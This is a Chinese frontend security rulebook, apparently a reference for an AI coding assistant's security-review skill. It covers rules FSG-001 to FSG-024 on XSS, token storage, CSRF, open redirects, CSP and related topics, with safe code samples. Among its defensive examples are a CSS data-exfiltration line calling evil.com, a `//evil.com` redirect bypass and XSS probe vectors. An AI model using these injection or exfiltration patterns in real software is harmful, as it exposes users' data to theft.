---
title: "前端安全高风险操作强约束"
aliases: []
domain: "ai-resources"
category: "runtime-tool-reference"
note_type: "tool-reference"
status: "internal-trial"
language: "zh-CN"
summary: "CC 泛微开发助手执行工具的来源说明，须由 CC 专业 Skill 按任务授权调用。"
source_path: "01-AI-Resources AI资料整理/04-Agents Agent规则/99-SourceFiles 原始资料/e-code智能化开发工具包/1.3.4/skills/ecode-security-review/references/frontend-security-rules.md"
tags: ["domain/ai-resources", "type/tool-reference", "folder/02-skills"]
---

> 此文件是工具参考说明，不是宿主自动加载入口；由 CC 专业 Skill 调度，不能扩大当前用户授权。知识查询使用包内共享 library，不复制知识正文。

# 前端安全高风险操作强约束

## 目录

- [规则解释](#规则解释)
- [XSS：原始 HTML 渲染](#fsg-001-原始-html-渲染)
- [XSS：URL 与链接注入](#fsg-002-url-与链接注入)
- [XSS：直接 DOM 操作](#fsg-003-直接-dom-操作)
- [XSS：模板与表达式注入](#fsg-004-模板与表达式注入)
- [敏感数据存储](#fsg-005-token-与敏感凭据存储)
- [硬编码密钥](#fsg-006-前端硬编码密钥与环境变量)
- [CSRF 防护](#fsg-007-csrf-token-与请求配置)
- [客户端授权](#fsg-008-客户端授权与路由守卫)
- [开放重定向](#fsg-009-开放重定向)
- [postMessage 安全](#fsg-010-postmessage-安全)
- [代码执行注入](#fsg-011-eval-与动态代码执行)
- [原型污染](#fsg-012-原型污染)
- [CSS 注入](#fsg-013-css-注入与数据外泄)
- [第三方脚本与 SRI](#fsg-014-第三方脚本与-sri)
- [Cookie 安全](#fsg-015-cookie-安全操作)
- [状态管理敏感数据](#fsg-016-状态管理中的敏感数据)
- [依赖安全](#fsg-017-前端依赖安全)
- [polyfill 供应链](#fsg-018-polyfill-与运行时补丁安全)
- [CSP 配置](#fsg-019-csp-配置)
- [Clickjacking](#fsg-020-clickjacking-与-frame-防护)
- [反向标签劫持](#fsg-021-反向标签劫持)
- [文件上传前端安全](#fsg-022-文件上传前端安全)
- [敏感数据过度暴露](#fsg-023-敏感数据过度暴露)
- [WebSocket 安全](#fsg-024-websocket-安全)
- [错误信息泄露](#fsg-025-错误信息与调试数据泄露)
- [React Router 安全](#fsg-026-react-router-安全)
- [axios 拦截器安全](#fsg-027-axios-拦截器安全)
- [MobX 状态安全](#fsg-028-mobx-状态安全)
- [Promise 错误处理](#fsg-029-promise-错误处理安全)
- [SSR 水合安全](#fsg-030-ssr-水合与初始状态安全)
- [OAuth、OIDC 与 SSO](#fsg-031-oauthoidc-与-sso-浏览器流程)
- [Trusted Types](#fsg-032-trusted-types-与-dom-sink-治理)
- [DOM Clobbering](#fsg-033-dom-clobbering-与命名属性)
- [Service Worker](#fsg-034-service-worker-与浏览器缓存)
- [请求凭据边界](#fsg-035-axiosfetch-请求目标与凭据边界)
- [客户端资源耗尽](#fsg-036-客户端资源耗尽与-redos)
- [下载与导出](#fsg-037-下载导出与-blob-url)
- [第三方数据边界](#fsg-038-第三方脚本组件与数据边界)
- [例外模板](#例外审批模板)

## 规则解释

- **禁止**：发现即阻断，不得生成、合并或发布。
- **必须**：缺少任一控制或可验证证据即阻断。
- **例外**：仅按 `../TOOL-REFERENCE.md` 的完整例外流程批准；临时注释、口头同意不构成例外。
- **不可信输入**：包括 URL 参数、hash 片段、表单输入、API 响应、`postMessage` 数据、`localStorage`/`sessionStorage` 读取值、第三方回调、用户生成内容（UGC）、CMS 内容、富文本编辑器输出及一切可被低权限用户修改的数据。
- **渲染上下文**：HTML 正文、HTML 属性、URL（href/src/action）、JavaScript 变量、CSS 值。同一不可信数据在不同上下文需要不同编码方式。

## FSG-001 原始 HTML 渲染

本规则为发布硬门禁。任何使用 `dangerouslySetInnerHTML`、`v-html`、`innerHTML` 或等价 API 渲染未净化内容的行为，结论必须为 `BLOCK`。

**禁止**

- 将不可信数据直接传入 React 的 `dangerouslySetInnerHTML`。
- 将不可信数据直接传入 Vue 的 `v-html` 指令。
- 使用 `element.innerHTML`、`outerHTML`、`insertAdjacentHTML` 写入不可信数据。
- 仅依赖正则、字符串替换或自研清洗函数处理 HTML；这些方案无法覆盖所有 XSS 向量。
- 将来源、清洗策略或信任边界不明的“已清洗 HTML”直接送入危险 sink。
- 使用 Markdown 渲染器后直接渲染 HTML 输出，未对 HTML 部分进行净化。

**必须**

- 优先使用框架默认的文本插值（React `{}` / Vue `{{ }}`），它们自动转义 HTML 实体。
- 确需渲染 HTML 时，使用 DOMPurify 进行净化，并配置允许标签和属性的允许列表：

```jsx
import DOMPurify from 'dompurify';

function SafeHtml({ html }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'br'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    ALLOW_DATA_ATTR: false,
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

- 对 `href` 和 `src` 属性额外校验协议，仅允许 `http:`、`https:`、`mailto:`、`tel:`，拒绝 `javascript:`、`data:`、`vbscript:`。
- 为 `target="_blank"` 的链接添加 `rel="noopener noreferrer"`。
- 如果使用 Markdown 渲染器，选择支持 HTML 净化的库（如 `react-markdown` 配合 `rehype-sanitize`），禁止使用 `marked` + `dangerouslySetInnerHTML` 的组合。
- 对富文本编辑器（如 Quill、TinyMCE、WangEditor）的输出，在最接近危险 sink 的受控边界执行成熟清洗；清洗后不得再拼接、解码或修改结构。
- 为每个 `dangerouslySetInnerHTML` / `v-html` 使用点编写负面测试，验证包含 `<script>`、`<img onerror>`、`<svg onload>`、`javascript:` 协议的输入被有效中和。

## FSG-002 URL 与链接注入

**禁止**

- 将不可信数据直接作为 `href`、`src`、`action`、`formaction`、`xlink:href` 的值，未校验协议。
- 使用 `javascript:`、`data:`、`vbscript:` 协议的用户可控 URL。
- 仅做字符串前缀检查（如 `url.startsWith('http')`）来判断 URL 安全性。

**必须**

- 对用户可控 URL 使用 `URL` 构造函数解析后校验 `protocol` 属性：

```jsx
function SafeLink({ href, children }) {
  try {
    const url = new URL(href, window.location.origin);
    if (!['http:', 'https:', 'mailto:', 'tel:'].includes(url.protocol)) {
      return <span>{children}</span>;
    }
    return <a href={url.href} rel="noopener noreferrer">{children}</a>;
  } catch {
    return <span>{children}</span>;
  }
}
```

- Vue 中使用自定义指令统一校验 `href` 绑定：

```js
const vSafeHref = {
  mounted(el, binding) {
    updateHref(el, binding.value);
  },
  updated(el, binding) {
    updateHref(el, binding.value);
  },
};

function updateHref(el, url) {
  try {
    const parsed = new URL(url);
    el.href = ['http:', 'https:', 'mailto:', 'tel:'].includes(parsed.protocol)
      ? url : '#';
  } catch {
    el.href = url.startsWith('/') ? url : '#';
  }
}
```

- `data:` URL 仅用于已知安全的内联资源（如小图标），且不得用于 `script`、`iframe` 上下文。
- 对 `window.location`、`window.open` 的赋值同样校验目标 URL 协议。

## FSG-003 直接 DOM 操作

**禁止**

- 使用 `element.innerHTML`、`outerHTML`、`insertAdjacentHTML` 写入不可信数据。
- 使用 `document.write()` 写入任何由用户数据组成的 HTML。
- 在 React/Vue 应用中使用 jQuery 的 `.html()`、`$.parseHTML()` 写入不可信数据。
- 在自定义 Vue 指令的 `el.innerHTML` 中使用不可信数据。

**必须**

- 优先使用 `textContent`、`innerText` 或框架的文本插值写入纯文本。
- 确需动态创建元素时，使用 `document.createElement` + `textContent` 设置内容，通过 `appendChild` 插入。
- 对于必须使用 innerHTML 的遗留场景，先用 DOMPurify 净化，并在代码审查中记录原因和补偿控制。
- 避免 `document.write`；现代 SPA 不应使用此 API。
- 为所有直接 DOM 操作编写测试，验证不可信输入不会被解析为 HTML。

## FSG-004 模板与表达式注入

**禁止**

- 将不可信数据作为 Vue 模板字符串编译（如 `new Vue({ template: userInput })`）。
- 将不可信数据作为 React 组件名或 JSX 标签名。
- 使用 `eval`、`new Function` 从不可信数据动态生成渲染逻辑。
- 在 Vue 中通过 `render` 函数的字符串形式嵌入不可信数据。

**必须**

- Vue 模板只能由开发者定义；用户内容通过数据绑定传入。
- 动态组件使用允许列表映射，而非直接使用用户传入的组件名：

```js
const ALLOWED_COMPONENTS = { 'user-card': UserCard, 'user-list': UserList };
// 模板: <component :is="ALLOWED_COMPONENTS[userType] || 'div'" />
```

- React 中不使用 `React.createElement(userInput, ...)` 形式的动态组件。
- 使用 `React.lazy` 时，动态 `import()` 的路径必须为代码中固定的字符串字面量。

## FSG-005 Token 与敏感凭据存储

本规则为发布硬门禁。认证 Token 存储在 `localStorage` 或 `sessionStorage` 且无文档化的补偿控制时，结论必须为 `BLOCK`。

**禁止**

- 将 JWT、Access Token、Refresh Token 或会话 ID 存储在 `localStorage` 或 `sessionStorage`。
- 将密码、私钥、API Key 或加密密钥存储在浏览器端的任何 Web Storage 中。
- 将敏感凭据存储在全局变量、window 对象或 MobX/Redux 可观测状态中。
- 在 URL 参数、hash 片段或路径中传递 Access Token、Refresh Token、会话 ID 或其他 Bearer 凭据。

**必须**

- 首选 `httpOnly` + `Secure` + `SameSite` Cookie 存储 Token，前端 JavaScript 不可读取。
- 如确需在内存中保存 Token（如 SPA），应在页面刷新时从 `httpOnly` Cookie 中的 Refresh Token 重新获取，而非持久化到 Storage。
- 使用 BFF（Backend for Frontend）模式，由服务端代理管理 Token。
- 如因遗留原因必须使用 `localStorage`，需满足全部例外条件：威胁模型文档、XSS 缓解措施（CSP、输入净化）、短期 Token（有效期不超过 15 分钟）、刷新机制、监控告警和安全审批。
- OAuth/OIDC 回调只接收短期授权码；完成校验和兑换后使用 `history.replaceState` 清理回调参数。

## FSG-006 前端硬编码密钥与环境变量

本规则为发布硬门禁。任何真实密钥、API Key、Token 出现在前端源码或 `REACT_APP_*` / `VITE_*` 等构建时环境变量中且会被打包进客户端产物时，结论必须为 `BLOCK`。

**禁止**

- 在前端源码（JS/TS/JSX/TSX/Vue/CSS）中硬编码 API Key、Secret Key、JWT 签名密钥、加密密钥、数据库连接串或任何可用于认证/签名/解密的真实值。
- 使用 `REACT_APP_SECRET`、`VITE_SECRET` 等以 `REACT_APP_` 或 `VITE_` 为前缀的环境变量存储不应暴露给浏览器的秘密——这些值会被构建工具内联到客户端产物中。
- 将 `.env` 文件中的秘密提交到版本控制。
- 通过 Base64、字符串拼接、异或或轻量混淆"隐藏"密钥——这些仍可从浏览器开发者工具或产物中提取。
- 将第三方服务的 API Key 直接在前端调用中使用（如直接在前端调用需要 Secret Key 的支付 API）。

**必须**

- 需要保密的密钥只能存储在后端，前端通过 BFF 或 API 代理间接使用。
- 公开的客户端 Key（如地图 SDK Key、分析 ID）可以使用环境变量，但必须：
  - 确认该 Key 是设计为公开的（服务端有访问控制/域名限制/配额限制）。
  - 在代码注释或文档中说明该 Key 的公开性质和服务端的补偿控制。
- 构建配置中区分 `development` 和 `production` 环境，生产环境不得包含开发后门或测试凭据。
- CI/CD 流程中执行秘密扫描，检测前端源码和构建产物中的泄露秘密。
- 一旦发现已提交的密钥，必须先在后端吊销/轮换，再从源码和历史中移除。

## FSG-007 CSRF Token 与请求配置

**禁止**

- 在基于 Cookie 认证的状态变更请求中不携带 CSRF Token。
- 将 CSRF Token 长期存储在 `localStorage`，或认为 `SameSite` 可以无条件替代 CSRF Token。
- 在 axios 中全局关闭 `withCredentials` 后又对需要 Cookie 的请求手动设置。
- 使用 GET/HEAD/OPTIONS 方法执行状态变更操作。

**必须**

- 为 axios 配置请求拦截器，自动从页面 Meta 标签或 Cookie 中读取 CSRF Token 并添加到请求头：

```js
import axios from 'axios';

const instance = axios.create();

instance.interceptors.request.use((config) => {
  const token = document
    .querySelector('meta[name="csrf-token"]')
    ?.getAttribute('content');
  if (token && ['post', 'put', 'patch', 'delete'].includes(config.method)) {
    config.headers['X-CSRF-Token'] = token;
  }
  return config;
});
```

- 确保后端正确配置 SameSite Cookie 属性（`Strict` 或 `Lax`）作为纵深防御。
- Synchronizer Token 从受控响应、DOM meta 或专用端点取得；Double Submit Cookie 需要 JavaScript 读取实际 Token 时，该 CSRF Cookie 不能是 `HttpOnly`，并应使用签名、会话绑定、`Secure` 和恰当 `SameSite` 防止伪造。
- 对跨域请求，后端 CORS 配置必须使用精确 Origin 允许列表，不得使用 `*` 配合 `credentials: true`。
- axios 全局配置 `withCredentials` 仅在确有跨域 Cookie 需求时开启，且后端 CORS 已正确配置。

## FSG-008 客户端授权与路由守卫

**禁止**

- 将路由守卫（React Router `<ProtectedRoute>` / Vue Router `beforeEach`）作为唯一的授权控制。
- 在前端代码中硬编码角色/权限判断，而后端不验证。
- 根据前端状态隐藏/禁用按钮或菜单作为唯一的操作授权。
- 把代码分包、动态导入、混淆或菜单隐藏当作保密或授权边界。

**必须**

- 所有授权检查在后端执行；前端路由守卫仅用于 UX 优化（隐藏不可访问的页面）。
- 每个状态变更请求由后端验证主体、动作、资源和租户。
- 前端权限判断使用从后端获取的权限列表，不硬编码角色到权限的映射。
- 可按性能和最小暴露需要采用动态导入，但不得把是否下载组件代码作为安全判定：

```jsx
const AdminPanel = React.lazy(() => import('./AdminPanel'));

function App() {
  const { canAccessAdmin } = usePermissions();
  return (
    <Routes>
      {canAccessAdmin && (
        <Route path="/admin" element={<AdminPanel />} />
      )}
    </Routes>
  );
}
```

- 前端权限错误的处理不泄露系统结构（如不区分"不存在"和"无权限"）。
- 管理组件、路由名称和 API 路径可能出现在客户端产物；任何必须保密的逻辑或秘密只能留在服务端。

## FSG-009 开放重定向

**禁止**

- 将用户可控的 URL 参数直接用作 `window.location.href`、`window.location.replace()`、`window.open()` 或 `<Redirect>` 的目标。
- 使用 React Router 的 `<Navigate to={userInput} />` 或 Vue Router 的 `router.push(userInput)` 处理用户可控的重定向目标，未校验目标。
- 仅检查 URL 是否以 `/` 开头来判断是否为站内路径（`//evil.com` 会被解析为协议相对 URL）。

**必须**

- 重定向目标使用服务端返回的固定 ID 或预定义的允许列表路径。
- 对用户可控的重定向目标进行严格校验：

```js
function getSafeRedirect(target) {
  if (!target || typeof target !== 'string') return '/';
  // 拒绝协议相对 URL 和绝对 URL
  if (target.startsWith('//') || target.startsWith('http://') || target.startsWith('https://')) {
    return '/';
  }
  // 仅允许站内相对路径
  if (target.startsWith('/') && !target.startsWith('//')) {
    return target;
  }
  return '/';
}
```

- 对回跳 URL（如登录后跳转）使用白名单域名或路径匹配。
- 后端也必须独立校验重定向目标，不依赖前端验证。

## FSG-010 postMessage 安全

**禁止**

- 接收 `postMessage` 时不校验 `event.origin`。
- 使用 `*` 作为 `postMessage` 的 `targetOrigin`。
- 信任 `event.source` 不做校验，或仅检查 `event.source === window`。
- 在 `postMessage` 消息处理中直接执行来自不可信来源的指令（如 JSONP 式回调名执行）。

**必须**

- 接收端使用精确 origin 允许列表校验：

```js
const ALLOWED_ORIGINS = ['https://app.example.com', 'https://cdn.example.com'];

window.addEventListener('message', (event) => {
  if (!ALLOWED_ORIGINS.includes(event.origin)) return;
  // 处理消息
});
```

- 发送端使用精确 `targetOrigin`，不使用 `*`：

```js
iframe.contentWindow.postMessage({ type: 'resize' }, 'https://widget.example.com');
```

- 消息体使用结构化格式（对象 + `type` 字段），不传字符串命令名。
- 同时校验预期的 `event.source` 窗口、消息 schema、字段类型、长度、版本和允许的 `type`；导航后再次确认 origin。
- 不接受消息中的函数名、路径、URL、HTML 或选择器作为动态执行参数。
- iframe 嵌入第三方内容时使用 `sandbox` 属性限制能力。

## FSG-011 eval 与动态代码执行

本规则为发布硬门禁。在不可信输入路径上使用 `eval`、`new Function`、字符串参数 `setTimeout`/`setInterval` 或 `document.write`，结论必须为 `BLOCK`。

**禁止**

- 使用 `eval()` 执行不可信数据。
- 使用 `new Function(...)` 从不可信数据创建函数。
- 使用 `setTimeout(string, delay)` 或 `setInterval(string, delay)` 形式。
- 使用 `Function` 构造器动态生成组件或渲染逻辑。
- 在 JSONP 场景中允许后端返回的回调名直接作为函数调用。

**必须**

- 使用 `JSON.parse()` 解析 JSON 数据，不使用 `eval`。
- 动态计算使用闭包或映射表，不使用 `new Function`。
- `setTimeout` 和 `setInterval` 使用函数引用：

```js
// 正确
setTimeout(() => { callback(arg); }, 100);
// 错误
setTimeout('callback(' + arg + ')', 100);
```

- Web Worker 不是执行不可信代码的安全沙箱；Worker 仍可使用同源能力和网络能力。
- CSP `script-src` 不添加 `'unsafe-eval'`；Trusted Types 用于约束 DOM XSS sink，不能把不可信 JavaScript 变成安全代码。

## FSG-012 原型污染

**禁止**

- 使用 `Object.assign({}, userInput)` 将不可信对象合并到目标对象，不检查 `__proto__`、`constructor`、`prototype` 键。
- 使用递归深拷贝或合并函数（如 `lodash.merge`、`lodash.set`）处理不可信输入，且版本存在已知原型污染漏洞。
- 对 URL 参数做 `qs.parse()` 后直接合并到配置对象。

**必须**

- 深拷贝和合并使用不存在原型污染的库版本，或使用 `Object.create(null)` 作为目标。
- 合并前过滤危险键：

```js
function safeMerge(target, source) {
  const DANGEROUS_KEYS = ['__proto__', 'constructor', 'prototype'];
  for (const key of Object.keys(source)) {
    if (DANGEROUS_KEYS.includes(key)) continue;
    // 安全合并
  }
}
```

- 使用 `Map` 代替普通对象存储用户可控的键值对。
- 对 `qs.parse()` 使用 `plainObjects: true` 创建无原型对象，并保持危险键过滤；不要依赖单个库选项替代版本修复和 schema 校验。
- 定期审计 `lodash`、`immer` 等库的版本，及时修复原型污染 CVE。

## FSG-013 CSS 注入与数据外泄

**禁止**

- 将不可信数据直接作为 `style` 属性值、CSS 自定义属性、CSS-in-JS 模板、Less 变量或 `<style>` 标签内容。
- 使用 `v-bind:style="userProvidedStyles"` 或 `style={userStyles}` 处理用户可控的完整样式字符串。
- 使用 CSS `url()` 函数引用用户可控 URL（可用于数据外泄：`background: url('https://evil.com/?data=xxx')`）。
- 在 CSS 中使用 `expression()`（旧 IE）或 `@import` 加载用户可控 URL。

**必须**

- 样式值使用对象语法，仅允许用户控制特定安全属性：

```jsx
// 安全：只允许用户控制颜色值
<div style={{ color: sanitizeColor(userColor) }} />

// 危险：用户控制整个样式字符串
<div style={userStyleString} />
```

- 对颜色值校验格式（`#RRGGBB`、`rgb()`、命名颜色）。
- 对 URL 类型的 CSS 值（如 `background-image`），校验 URL 协议和域名。
- 禁用 CSS `url()` 中的用户可控 URL，或使用允许列表。
- 使用 CSP 中的 `style-src` 限制样式来源。
- Less/CSS 构建阶段不读取用户可控导入路径、远程 URL 或未审计变量文件；生产构建不允许不可信内容参与预处理器编译。

## FSG-014 第三方脚本与 SRI

**禁止**

- 通过 `<script src="https://cdn.example.com/lib.js">` 引入内容固定的第三方脚本时不添加 SRI；动态供应商脚本不能使用 SRI 时，必须采用隔离、数据最小化、严格 CSP、变更监控和例外审批。
- 从非 HTTPS 来源加载脚本。
- 引入来源不受信任的第三方脚本（如未知 CDN、个人 GitHub Pages）。
- 在生产环境中加载未压缩/未版本固定的第三方脚本（如 `latest` 标签）。

**必须**

- 第三方脚本添加 `integrity` 属性和 `crossorigin="anonymous"`：

```html
<script
  src="https://cdn.example.com/lib@1.2.3.min.js"
  integrity="sha384-abc123..."
  crossorigin="anonymous">
</script>
```

- 优先使用 npm 包管理而非 CDN 引入，使依赖可审计、可锁定版本。
- 优先自托管已审计脚本。确需 CDN 时固定精确版本和内容摘要，使用 HTTPS、SRI、`crossorigin` 与 CSP；CDN 品牌本身不构成信任。
- 对第三方脚本进行内容安全审计，了解其权限和数据处理行为。
- CSP 的 `script-src` 配置允许列表域名，不使用 `*`。

## FSG-015 Cookie 安全操作

**禁止**

- 在 JavaScript 中创建 Cookie 时缺少 `Secure`、恰当 `SameSite` 或最小 `Path`，或把 JavaScript 可写 Cookie 当作可信身份、权限或完整性数据。
- 在前端代码中读取或操作 `httpOnly` Cookie 的内容（如通过 `document.cookie` 尝试读取——虽然浏览器会阻止，但不应在代码中尝试）。
- 在 Cookie 中存储敏感数据（如密码、完整支付信息）。
- 为 Cookie 设置过大的 `Domain` 范围（如 `.example.com` 会让所有子域读取）。

**必须**

- 前端创建的 Cookie 必须设置 `Secure`、`SameSite=Lax|Strict`。
- Cookie 的 `Path` 限定到最小必要范围。
- 敏感 Cookie 由后端设置 `httpOnly`，前端不直接读取。
- `HttpOnly` 只能由服务端 `Set-Cookie` 设置；前端不得声称通过 `document.cookie` 创建了 `HttpOnly` Cookie。
- 前端仅存储非敏感的 UI 偏好（如主题、语言）在 Cookie 中。
- Cookie 中不包含用户身份信息或权限数据，这些由后端 Session/JWT 管理。

## FSG-016 状态管理中的敏感数据

**禁止**

- 在 MobX observable、Redux store 或 React Context 中存储密码、Refresh Token、密钥、完整支付卡号、身份证号等高度敏感或长期凭据。
- 将完整的 API 响应（可能包含内部字段、调试信息）直接存入全局状态。
- 在 MobX 中使用 `autoObservable` 对包含敏感字段的对象做深度可观测，导致敏感数据在 DevTools 中可见。

**必须**

- 敏感数据仅在需要时按需获取，使用后立即从状态中清除。
- 全局状态仅存储最小必要数据；敏感字段在后端脱敏后返回。
- MobX store 设计中明确区分公开数据和敏感数据，敏感数据不放入可观测状态：

```js
class UserStore {
  // 公开信息，可观测
  profile = observable({ id: '', name: '', avatar: '' });

  // 敏密数据不放入 observable，仅在闭包内临时使用
  async verifyIdentity(idToken) {
    const result = await api.verify(idToken);
    // 处理后不保留敏感数据
  }
}
```

- 生产构建中关闭 MobX DevTools 和 Redux DevTools。
- 状态持久化（`mobx-persist`、`redux-persist`）不持久化敏感字段。
- 架构确需在内存保存短期 Access Token 时，限制其受众、权限和有效期，不持久化，不写日志/DevTools，并明确 XSS 后 Token 仍可能被滥用。

## FSG-017 前端依赖安全

**禁止**

- 使用存在已知高危漏洞且已有修复版本的依赖。
- 在无锁文件、无制品摘要或 CI 未使用锁文件安装的情况下，使用 `latest`、`*` 或宽泛版本范围。
- 从未批准、未做命名空间隔离或会被 dependency confusion 覆盖的 registry 安装包。
- 在 `package.json` 中包含不必要的依赖。
- 忽略 `npm audit` 或 `yarn audit` 的高危/严重漏洞报告。

**必须**

- 使用 `package-lock.json` 或 `yarn.lock` 锁定完整依赖树。
- 定期执行 `npm audit` 或使用 Snyk、Dependabot 等工具扫描依赖漏洞。
- 依据可利用性、暴露面、数据影响和组织 SLA 修复漏洞；已知被利用、可远程利用且影响当前路径的问题按发布阻断处理。
- 使用 `npm ci` 而非 `npm install` 进行 CI/CD 安装，确保与 lockfile 一致。
- 审计新引入依赖的维护状态、下载量和已知安全问题。
- 对 `preinstall`/`postinstall` 脚本保持警惕，审计其在安装时执行的代码。
- 使用 `overrides`（npm）或 `resolutions`（yarn）强制修复传递依赖中的漏洞版本。

## FSG-018 polyfill 与运行时补丁安全

本规则为发布硬门禁。从不受信任的第三方 CDN 加载 polyfill（特别是 polyfill.io 域名）且无 SRI 校验时，结论必须为 `BLOCK`。

**禁止**

- 从 `polyfill.io` 或其关联域名加载 polyfill 脚本（2024 年供应链事件后该域名已不可信）。
- 从任何不受控的第三方 CDN 加载运行时 polyfill 而不添加 SRI。
- 在 HTML 中通过 `<script src="https://cdn.polyfill.io/...">` 形式加载 polyfill。
- 使用 `cdn.polyfill.io`、`polyfill.io`、`v2.polyfill.io` 等已知不安全域名的任何变体。

**必须**

- 使用维护中的 npm 包（如 `core-js`，必要时配合 `regenerator-runtime`）通过构建工具引入 polyfill，而非远程运行时代码服务；不再使用已废弃的 Babel polyfill 聚合包。
- 确需 CDN 时优先自建受控 CDN；固定精确版本并添加 SRI、`crossorigin` 和 CSP。
- 使用 `browserslist` 配置精确控制 polyfill 范围，避免引入不必要的代码。
- 构建工具（Babel、SWC）的 `useBuiltIns: 'usage'` 配置按需引入 polyfill。
- 对所有外部脚本（包括 polyfill）执行 SRI 校验。

## FSG-019 CSP 配置

**禁止**

- 生产环境不设置 Content Security Policy 头。
- CSP 中 `script-src` 使用 `unsafe-inline` 且无 `nonce` 或 `hash` 补偿。
- CSP 中 `script-src` 使用 `unsafe-eval`（除非有充分理由和架构证据）。
- CSP 使用 `default-src *` 或 `script-src *`。
- 仅通过 `<meta http-equiv="Content-Security-Policy">` 设置生产 CSP；meta 模式不支持 `frame-ancestors`、sandbox 和报告等完整能力，且受文档位置约束。
- 配置 CSP 报告端点后不监控、不限流，或信任未经验证的报告内容。

**必须**

- 生产环境通过 HTTP 响应头设置 CSP，至少限制 `default-src 'self'`。
- `script-src` 使用 `nonce` 或 `hash` 替代 `unsafe-inline`：

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  object-src 'none';
  style-src 'self' 'nonce-{random}';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'none';
  form-action 'self';
  report-uri /csp-report;
```

- 逐步收紧 CSP：先使用 `Content-Security-Policy-Report-Only` 观察违规，稳定后切换为强制策略。
- 有运营能力时使用 `Reporting-Endpoints` + `report-to` 收集违规；报告视为不可信输入，限制大小/频率并避免记录敏感页面数据。
- `connect-src` 限制 AJAX/Fetch/WebSocket 的目标域名。
- 对支持浏览器逐步启用 `require-trusted-types-for 'script'` 并只允许命名、可审计的 Trusted Types policy；先用 Report-Only 收集兼容性证据。
- `frame-ancestors 'none'`（等价于 `X-Frame-Options: DENY`）防止 clickjacking。
- React 应用如使用内联样式，`style-src` 可配合 `nonce` 或使用 CSS-in-JS 库的安全模式。
- 定期审查 CSP 违规报告并修复。

## FSG-020 Clickjacking 与 Frame 防护

**禁止**

- 应用页面可被任意第三方通过 `<iframe>` 嵌入，且无 `X-Frame-Options` 或 CSP `frame-ancestors` 保护。
- 对敏感操作页面（如支付、密码修改、授权确认）不设置 `frame-ancestors 'none'`。

**必须**

- 通过 HTTP 头设置 `X-Frame-Options: DENY` 或 `SAMEORIGIN`。
- 使用 CSP `frame-ancestors` 替代或补充 `X-Frame-Options`（CSP 支持多域名允许列表）。
- 敏感操作页面设置 `frame-ancestors 'none'`。
- 如需被特定域名嵌入，使用精确域名允许列表，不使用 `*`。
- 对 `<iframe>` 嵌入的第三方内容使用 `sandbox` 属性限制能力：

```html
<iframe
  src="https://widget.example.com"
  sandbox="allow-scripts allow-same-origin allow-forms"
  referrerpolicy="no-referrer">
</iframe>
```

## FSG-021 反向标签劫持

**禁止**

- 使用 `window.open()` 或 `target="_blank"` 打开外部链接时未阻断 opener；`noreferrer` 是否启用根据 Referrer-Policy 和业务需要决定。
- 通过 `window.open(url)` 打开的外部页面可以反向操作原页面（`window.opener`）。

**必须**

- 所有 `target="_blank"` 外部链接至少添加 `rel="noopener"`；需隐藏 Referer 时再添加 `noreferrer`：

```jsx
<a href="https://external.com" target="_blank" rel="noopener noreferrer">External link</a>
```

- `window.open()` 返回的引用不保留在可被外部访问的变量中。
- 不依赖浏览器版本的隐式 `noopener` 行为；链接显式设置 `rel="noopener noreferrer"`，`window.open` 显式使用 `noopener` 特性并清除不需要的 opener 引用。
- 对 `window.open()` 的第二个参数不使用用户可控值。

## FSG-022 文件上传前端安全

**禁止**

- 仅在前端校验文件类型和大小，后端不做独立验证。
- 将上传的文件内容直接通过 `FileReader.readAsDataURL()` 大文件转为 base64 存入状态。
- 使用用户原始文件名作为上传后的存储路径或显示名（应在服务端重命名）。
- 前端接受任意 MIME 类型或文件扩展名，不做允许列表校验。

**必须**

- 前端做基本的文件类型和大小校验作为 UX 优化，后端做权威校验。
- 前端可检查扩展名、`file.type` 和必要的文件头用于快速反馈，但这些数据均可伪造，服务端必须重新识别内容并执行权威校验。
- 大文件使用分片上传或流式上传，不一次性读入内存。
- 前端允许列表与后端一致：

```jsx
const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/gif'];
const MAX_SIZE = 5 * 1024 * 1024; // 5MB

function validateFile(file) {
  if (!ALLOWED_TYPES.includes(file.type)) {
    return { valid: false, error: 'Unsupported file type' };
  }
  if (file.size > MAX_SIZE) {
    return { valid: false, error: 'File too large' };
  }
  return { valid: true };
}
```

- 显示 `file.name` 时按纯文本处理；存储名、路径规范化和重命名完全由服务端负责。
- 预览上传图片使用 `URL.createObjectURL()` 而非 base64，预览结束后调用 `URL.revokeObjectURL()`。

## FSG-023 敏感数据过度暴露

**禁止**

- API 响应包含超出当前页面所需的字段（如列表接口返回完整对象含密码哈希、内部 ID、权限信息）。
- 前端接收 API 响应后直接存入全局状态或 localStorage，不进行字段过滤。
- 在客户端产物、注释、Source Map、调试清单或错误页中暴露秘密、内部凭据、管理口令、未发布功能开关或非必要敏感架构数据。

**必须**

- 后端 API 响应使用 DTO 进行字段允许列表过滤，只返回当前场景所需字段。
- 前端从 API 响应中只提取必要字段存入状态。
- 生产构建禁止输出凭据、个人信息、完整请求/响应或内部错误；普通诊断日志是否保留由数据分级和运维需要决定：

```js
// webpack/vite 生产配置
if (process.env.NODE_ENV === 'production') {
  // 移除 console.log
}
```

- Source Map 不得嵌入秘密或生产配置；如发布公共 Source Map，需明确接受源码公开风险。私有调试图必须受访问控制并与公开静态资源分离。
- API 错误响应使用稳定的通用错误码和消息，不返回堆栈、SQL 或内部路径。
- 不在前端存储或显示完整的敏感标识（如完整身份证号、完整银行卡号），显示时脱敏。

## FSG-024 WebSocket 安全

**禁止**

- WebSocket 连接使用 `ws://` 而非 `wss://`（明文传输）。
- 不验证 WebSocket 消息的来源和认证状态。
- 在 WebSocket 消息处理中直接执行来自服务端的指令作为动态代码。
- 不限制 WebSocket 消息大小和频率。

**必须**

- 生产环境使用 `wss://`（WebSocket Secure）连接。
- 浏览器无法为 WebSocket 握手任意设置 Authorization 头。优先使用 `Secure`、`HttpOnly` Cookie 并防 Cross-Site WebSocket Hijacking；需要显式票据时使用短期、单次、受众受限票据，禁止长期 Token 出现在查询参数。
- 后端验证 WebSocket 连接的 Origin 和认证状态。
- 对 WebSocket 消息做输入验证，消息体使用结构化格式（JSON + `type` 字段）。
